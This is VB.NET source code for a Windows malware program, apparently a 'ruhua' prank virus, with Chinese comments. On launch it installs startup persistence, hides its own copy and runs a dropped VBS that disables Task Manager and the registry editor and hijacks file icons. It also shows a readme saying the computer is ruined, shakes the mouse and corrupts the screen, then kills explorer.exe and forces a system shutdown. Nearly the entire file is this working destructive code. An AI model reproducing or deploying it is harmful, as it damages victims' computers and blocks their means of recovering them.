Imports System.Windows.Forms
Imports System.Drawing
Imports System.IO
Imports System.Media.SoundPlayer
Imports 反色模块
Public Class Form2
    Public Declare Function RtlAdjustPrivilege Lib "ntdll" (ByVal Privilege As Long, ByVal Newvalue As Long, ByVal NewThread As Long, ByRef Oldvalue As Long) As Long
    Public Declare Function NtShutdownSystem Lib "ntdll" (ByVal ShutdownAction As Long) As Long
    Public Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As Long '获得整个屏幕绘制
    Public Declare Function GetDesktopWindow Lib "user32" () As Long '获得整个桌面绘制
    Public Declare Function SetCursorPos Lib "user32" (ByVal x As Integer, ByVal y As Integer) As Integer '设置鼠标位置。
    Public Declare Function Beep Lib "kernel32" (dwFreq As Integer, dwDuration As Integer) As Integer
    'Public Declare Function PlaySound Lib "winmm.dll" （ByVal lpszSoundName As String， ByVal hModule As Integer， ByVal dwFlags As Integer） As Integer
    Dim z As Long
    Dim a As Long
    Const Do0 = 264
    Const Re = 297
    Const Mi = 330
    Const Fa = 352
    Const Sol = 396
    Const La = 440
    Const Ti = 495
    Const Do1 = 528
    Const T4 = 1000
    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next
        a = 0
        Dim path, ws, fso
        ws = CreateObject("wscript.shell") '定义对象
        fso = CreateObject("scripting.filesystemobject") '定义对象
        ws.regwrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\病毒子键", "C:\this\rh.exe", "REG_SZ")
        If Not fso.FolderExists("C:\this") Then '如果C盘下的this文件夹没有则创建
            fso.createfolder("C:\this") '创建文件夹
            fso.CopyFile(Application.ExecutablePath, "C:\this\rh.exe")
            ws.run("cmd.exe /c attrib ""C:\this"" +h", 0) '批处理隐藏文件夹

            'If fso.fileexists("rh.jpg") Then '如果本目录下存在jpg文件则复制到指定目录
            'fso.copyfile("rh.jpg", "C:\this\rh.jpg")
            'End If
            ws.regwrite("HKCU\Control Panel\Desktop\Wallpaper", "C:\this\rh.jpg", "REG_SZ") 'Load picture file in regedit.exe

            Dim a
            a = fso.createtextfile("C:\this\a.vbs")
            With a
                .writeline("On Error Resume Next")
                .writeline("set ws=createobject(""wscript.shell"")")
                .writeline("ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr"",1,""REG_DWORD""")
                .writeline("ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools"",1,""REG_DWORD""")
                .writeline("for path=1 to 44")
                .writeline("ws.regwrite ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons\""&path,""C:\this\rh.exe"",""REG_SZ""")
                .writeline("Next")
                .writeline("ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{7007ACC7-3202-11D1-AAD2-00805FC1270E}\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\CLSID\{2559a1f1-21d7-11d4-bdaf-00c04f60b9f0}\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\CLSID\{2559a1f0-21d7-11d4-bdaf-00c04f60b9f0}\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\exefile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\zipfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\lnkfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\mp3file\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\mp4file\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\rmvbfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\pngfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\jpgfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\txtfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\htmlfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .close
                .run("C:\this\a.vbs")
            End With
            Dim o As Object = CreateObject("scripting.filesystemobject")
            Dim b = o.createtextfile("C:\this\readme.txt")
            b.writeline("Your computer was damaged by ruhua")
            b.writeline("你的电脑被如花亲坏了")
            b.writeline("In a word , your computer not have any hop")
            b.writeline("一句话说，你电脑没救了")
            b.close
            'Threading.Thread.Sleep(5000) '延时5秒
            'RtlAdjustPrivilege(&H13, &H1, &H0, &H0) '提升到关机权限
            'NtShutdownSystem(&H0) '关机
            '////////////////////////////////////////////////////////////////
            '释放程序中的资源文件
            '////////////////////////////////////////////////////////////////
            Dim rh As Byte() = My.Resources.Resource1.bakgroundimage
            Dim s As Stream = File.Create("C:\this\rh.jpg")
            s.Write(rh, 0, rh.Length)
            s.Close()
            'Dim sound As Byte() = My.Resources.Resource1.sound
            'Dim music As Stream = File.Create("C:\this\sound.mp3")
            'music.Write(sound, 0, sound.Length)
            'music.Close()
            '////////////////////////////////////////////////////////////////
            'this is end
            '////////////////////////////////////////////////////////////////
        End If
        ws.regwrite("HKCU\Control Panel\Desktop\Wallpaper", "C:\this\rh.jpg", "REG_SZ")
        ws.run("C:\this\a.vbs") '运行vbs
        Dim newthread0 As New Threading.Thread(AddressOf General)
        newthread0.Start()
        Timer2.Start()
        Dim newthread3 As New Threading.Thread(AddressOf Music)
        newthread3.Start()
    End Sub
    Sub General()
        Shell("notepad.exe C:\this\readme.txt", AppWinStyle.NormalFocus)
        Dim form2 As New Form2
        'form2.Hide()
        Dim newthread As New Threading.Thread(AddressOf Drowerror)
        newthread.Start()
        Dim newthread2 As New Threading.Thread(AddressOf Shakemouse)
        newthread2.Start()
        'Dim newthread3 As New Threading.Thread(AddressOf Playsound)
        'newthread3.Start()
        Threading.Thread.Sleep(1000 * 60 * 2)
        Shell("taskkill /im explorer.exe /f", 0)
        Threading.Thread.Sleep(1000 * 60)
        RtlAdjustPrivilege(&H13, &H1, &H0, &H0)
        NtShutdownSystem(&H0)
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim form As New Form1
        form.Show()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Top = Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width / 2
        Me.Left = Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height / 0.7
    End Sub
    Sub Drowerror()
        Threading.Thread.Sleep(10000)
        Dim a As New Form2
        a.Hide()
        Dim where
        Do
            where = System.Windows.Forms.Control.MousePosition '获得当前鼠标位置
            SetCursorPos(CDbl(where.x) + 5 * (-1) ^ Int(1 + 2 * Rnd()), CDbl(where.y) + 5 * (-1) ^ Int(1 + 2 * Rnd())) 'Set mouse position
            Threading.Thread.Sleep(50) 'stop 0.05 second
        Loop
    End Sub
    Sub Shakemouse()
        Threading.Thread.Sleep(10000)
again:
        Dim ico As Bitmap = My.Resources.Resource1.tast.ToBitmap 'add resources in exe
        Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow())) 'get desktop，还要每一个窗口
        Do
            Try
                screen.DrawImage(ico, Windows.Forms.Control.MousePosition)
                Threading.Thread.Sleep(1)
            Catch ex As Exception '如果超出内存则运行下面的
                screen.Dispose() '释放内存
                Threading.Thread.Sleep(10000) 'stop 10 second
                GoTo again 'jump to again
            End Try
        Loop
    End Sub
    'Sub Playsound() '播放灵魂歌曲
    'Dim music As String = "C:\this\sound.mp3"
    '   PlaySound(music, 0, &H20000)
    '  Threading.Thread.Sleep(1000 * 60)
    'End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        a = a + 1
        If a = 30 Then
            Timer3.Start()
        ElseIf a = 120 Then
            Timer1.Start()
        End If
    End Sub
    Sub Music()
        Beep(Fa, 500)
        Beep(Fa, 300)
        Beep(Fa, 300)
        Beep(Sol, 300)
        Beep(La, 500)
        Beep(La, 800)
        Beep(Mi, 800)
        Threading.Thread.Sleep(1000)
        Beep(Re, 500)
        Beep(Re, 300)
        Beep(Re, 300)
        Beep(Mi, 300)
        Beep(Fa, 500)
        Beep(Fa, 800)
        Beep(Do0, 800)
        Threading.Thread.Sleep(1000)
        Beep(Do0, 500)
        Beep(Mi, 500)
        Beep(Re, 500)
        Threading.Thread.Sleep(1000)
        Beep(Do0, 500)
        Beep(Mi, 500)
        Beep(Re, 500)
        Threading.Thread.Sleep(1000)
        Beep(Do0, 500)
        Beep(Mi, 500)
        Beep(Re, 500)
        Beep(Re, 800)
        Beep(Re, 1000)
        Beep(800, 1000 * 3)
        Threading.Thread.Sleep(1000)
        Beep(800, 1000 * 3)
        Threading.Thread.Sleep(1000)
        Beep(800, 1000 * 3)
        Threading.Thread.Sleep(1000)
        Beep(800, 1000 * 3)
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Dim www As Graphics = Graphics.FromHdc(ApiClass.GetWindowDC(ApiClass.GetDesktopWindow))
        Dim scr As Screen = Screen.PrimaryScreen
        Dim temp1 As New Bitmap(scr.WorkingArea.Width, scr.WorkingArea.Height)
        Dim ww As Graphics = Graphics.FromImage(temp1)
        ww.CopyFromScreen(New Point, New Point, scr.WorkingArea.Size)
        Dim handle As IntPtr = Class1.PContray(temp1).GetHicon
        www.DrawIcon(Icon.FromHandle(handle), scr.WorkingArea)
    End Sub
End Class